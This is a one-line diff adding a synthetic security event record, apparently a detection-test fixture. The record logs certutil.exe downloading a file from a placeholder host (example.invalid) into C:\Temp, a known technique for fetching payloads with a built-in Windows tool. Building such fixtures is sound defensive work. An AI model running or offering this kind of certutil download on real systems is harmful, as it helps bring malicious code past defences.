@@ -1,0 +1,1 @@
+{"schema_version":1,"synthetic":true,"event":{"FileName":"certutil.exe","ProcessCommandLine":"certutil.exe -urlcache -f http://example.invalid/sample.bin C:\\Temp\\sample.bin"}}
